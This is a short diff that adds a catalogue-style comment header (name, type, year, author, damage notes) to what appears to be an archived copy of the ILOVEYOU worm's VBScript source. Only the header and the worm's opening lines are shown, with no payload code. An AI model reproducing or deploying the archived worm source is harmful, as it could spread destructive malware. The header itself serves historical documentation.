@@ -1,3 +1,15 @@
+' ------------------------------------------------------------
+' name      ILOVEYOU
+' type      worm
+' cve       —
+' year      2000
+' os        windows
+' authors   Onel de Guzman (spyder)
+' source    original — widely archived
+' archived  krisyotam
+' notes     spread via Outlook, overwrote files, caused ~$10B damage
+' ------------------------------------------------------------
+
 rem  barok -loveletter(vbe) <i hate go to school>
 rem  by: spyder  / ispyder@mail.com / @GRAMMERSoft Group / Manila,Philippines
 On Error Resume Next
